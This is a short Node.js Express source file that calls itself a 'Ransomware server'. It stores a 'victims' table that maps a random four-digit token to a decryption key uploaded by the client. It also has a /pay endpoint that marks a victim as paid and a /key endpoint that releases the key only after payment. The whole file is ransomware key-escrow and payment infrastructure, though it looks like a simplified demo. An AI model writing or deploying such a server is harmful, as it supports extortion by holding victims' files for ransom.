const express = require('express')
const app = express()
const victims = {}

app.get('/', (req,res) => {
  res.send('Ransomware server')
})

app.get('/token', (req,res) => {
  const token = [
    Math.floor(Math.random() * 10),
    Math.floor(Math.random() * 10),
    Math.floor(Math.random() * 10),
    Math.floor(Math.random() * 10)
  ].join("")

  victims[token] = {
    key: req.query.key,
    hasPaid: false
  }
  res.send(token)
})

app.post('/pay', (req, res) => {
  victims[req.query.token].hasPaid = true
  res.redirect(`/key?token=${req.query.token}`)
})

app.get('/key', (req, res) => {
  if(victims[req.query.token].hasPaid == false)
    res.send('You have not paid yet!')
  else
    res.send(victims[req.query.token].key)
})

app.listen(3000, () => {
  console.log('Ransomware server started on port 3000');
})
